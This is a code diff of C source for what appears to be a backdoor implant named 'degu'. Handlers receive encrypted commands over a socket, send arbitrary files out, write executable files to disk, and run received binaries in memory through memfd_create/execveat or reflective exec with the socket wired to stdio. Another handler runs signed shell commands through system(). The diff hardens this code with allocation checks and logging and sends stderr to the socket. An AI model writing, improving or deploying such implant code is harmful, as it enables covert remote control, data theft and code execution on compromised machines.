@@ -6,6 +6,7 @@
 #include <errno.h>
 #include <signal.h>
 #include <fcntl.h>
+#include <limits.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/time.h>
@@ -17,6 +18,7 @@
 #include "degu.h"
 
 int degu_ulexec(unsigned char *bin, char *argv[],size_t size){
+    TRACE("running %s in ulexec",argv[0]);
     return reflect_execv(bin, argv,size);
 }
 
@@ -86,14 +88,17 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
     int r=0;
     while ( r < total_len ){
         i = recv(sock, payload + r, 32, 0);
-        if(i == -1) break;
+        if( i <= 0) break;
         r+=i;
     }
 
     xdata(secret, payload, total_len);
 
     char *path = malloc(lpath + 1);
-
+    if (!path) { 
+        free(payload);
+        return; 
+    }
     memset(path, 0, lpath + 1);
     memcpy(path, payload + 8, lpath);
 
@@ -101,6 +106,7 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
     int file = open(path, O_RDONLY);
 
     if( file < 0 ){
+        free(path);
         free(payload);
         return; // send 404 ?
     }
@@ -119,7 +125,12 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
     unsigned int delta = 32 - ((file_stat.st_size + 4 ) % 32);
 
     unsigned char *response = malloc( file_stat.st_size + 4 + delta );
-
+    if (!response) { 
+        close(file);
+        free(path);
+        free(payload);
+        return; 
+    }
     memcpy(response, flen, 4);
     res = read(file, response + 4, file_stat.st_size);
     memset(response + 4 + file_stat.st_size , 0, delta);
@@ -154,51 +165,55 @@ void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret){
     // header + lendata + lenpath == 12
     ssize_t total_len = ldata + lpath + 12;
 
-    if (total_len < 32)
-        total_len = 32;
+    if ( total_len < 32 )
+         total_len = 32;
+
     TRACE("total len %i ldata %i lpath %i", total_len, ldata, lpath );
 
-    unsigned char *payload = malloc(total_len * sizeof *payload + 1);
+    
+    unsigned char *payload = malloc( total_len + total_len % 1024 + 1 );
 
-    if(payload == NULL){
+    if( payload == NULL ){
+        TRACE("error malloc %i", total_len + 1 );
         return;
     }
-
-    int r=0;
+    
+    unsigned int r=0;
     int i;
 
     while ( r < total_len ){
         i = recv(sock, payload + r, 1024, 0);
-        if ( i < 0 ) break;
+        if( i <= 0) break;
         r+=i;
     }
 
-    xdata(secret, payload, total_len);
+    xdata( secret, payload, total_len );
 
-    char *path = malloc(lpath * sizeof *path + 1 );
+    char *path = malloc( lpath + 1 );
+    if (!path) { 
+        free(payload);
+        return; 
+    }
+    memset( path, 0, lpath + 1 );
 
-    memset(path, 0, lpath + 1);
+    memcpy( path, payload + 12, lpath );
 
-    memcpy(path, cur, lpath);
-
-    cur += lpath;
-
-    TRACE("up file = %s len data %i", path, ldata);
+    TRACE("up file = %s len data %i", path, ldata );
 
     int fd = open(path, O_CREAT|O_WRONLY, 0755);
     if ( fd < 0 ){
-        free(payload);
-        free(path);
+        free( payload );
+        free( path );
         return;
     }
     write( fd, payload + 12 + lpath, ldata);
-    close(fd);
+    close( fd );
 
-    free(payload);
-    free(path);
+    free( payload );
+    free( path );
 }
 
-//|<o)~|len*4|lenargv*4|argc|argv|data
+//|<o)~|len*4|lenargv*4|argc|argv|data 
 void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
         unsigned char *cur = header + 4;
@@ -213,23 +228,24 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
         cur += 4;
 
-
         // 13 == header + lenbin + lenargv + argc(<255)
         ssize_t total_len = lbin + largv + 13 ;
         TRACE("total_len = %i lbin = %i largv = %i ",total_len,lbin,largv);
-        
-        unsigned char *payload = malloc( total_len );
-        
-        bzero(payload,total_len);
 
-        if(payload == NULL)
+        unsigned char *payload = malloc( total_len + 32 );
+
+        if( !payload  ){
+            TRACE("error malloc %i", total_len + 1 );
             return;
+        }
+        
+        bzero(payload, total_len + 32 );
 
         int r=0;
 
         while ( r < total_len ){
             i = recv(sock, payload + r, 32, 0);
-            if(i == -1) break; 
+            if( i <= 0 ) break;
             r+=i;
         }
 
@@ -238,39 +254,56 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
         unsigned char *bin = payload + 13 + largv;
 
         char * str_argv = malloc(largv + 1);
-
+        if (!str_argv ){
+            free( payload );
+            return;
+        }
         memset(str_argv, 0, largv + 1);
         memcpy(str_argv, payload + 13, largv);
 
-        //ugliest way to get argv didn't found worst way
         char **argv = NULL;
-        int index = 0;
+        int argc = 0;
+
+        TRACE("argv=%s ",str_argv);
 
         char *tok = strtok(str_argv, " ");
-        while(tok != NULL) {
-            argv = realloc(argv, sizeof(char*) * (index + 1) );
-            argv[index++] = strdup(tok);
+        while (tok != NULL) {
+            argv = realloc(argv, sizeof(char*) * (argc + 1));
+            if (!argv){
+                free(payload);
+                free(str_argv);
+                return;
+            }
+            argv[argc++] = tok;
             tok = strtok(NULL, " ");
         }
-        argv = realloc(argv, sizeof(char*)*(index+1));
-        argv[index] = NULL;
 
+        argv = realloc(argv, sizeof(char*) * (argc + 1));
+        if (!argv){
+            free(payload);
+            free(str_argv);
+            return;
+        }
+        argv[argc] = NULL;
+        
         for (int f=0;f<1024;f++)
             if (f != sock)
                 close(f);
         
         dup2(sock,0);
         dup2(sock,1);
-        close(2);
+        dup2(sock,2);
         close(sock);
         
         int ret = 1;
         
         if (memcmp(DEGU_EXE_UL,header,4)==0){
             ret = degu_ulexec(bin,argv,lbin+1024);
+            TRACE("trying ulexec %i",ret);
         }
         if(ret == 1){
             int fd = degu_memfd_create("", 1);
+            TRACE("inside memfd exec  fd=%i",ret);
             write(fd, bin, lbin + 1024);
             degu_execveat(fd, "", argv, NULL, 0x1000); 
         }
@@ -282,7 +315,16 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 void knock_ghost_exe(unsigned  char *buffer, size_t len){
 
     unsigned char *cmd = malloc( len + 1 ) ;
+    if(!cmd){
+        TRACE("unable to malloc cmd");
+        return;
+    }
     unsigned char *sig = malloc( 64 );
+    if(!sig){
+        TRACE("unable to malloc sig");
+        free(cmd);
+        return;
+    }
     memset(cmd, 0, len + 1 );
     memcpy(cmd, buffer, len );
     memcpy(sig, buffer + len, 64 );
@@ -296,13 +338,19 @@ void knock_ghost_exe(unsigned  char *buffer, size_t len){
         pid = fork();
         if(pid == -1){
             TRACE("fork error");
+            free(cmd);
+            free(sig);
             return;
         }
         if(pid == 0){
-            system((char*)cmd);
+            int ret = system((char*)cmd);
+            TRACE("system ret=%i", ret);
             exit(EXIT_SUCCESS);
-        }else
+        }else{
             signal(SIGCHLD,SIG_IGN);
+        }
+        free(cmd);
+        free(sig);
         return;
     }
 
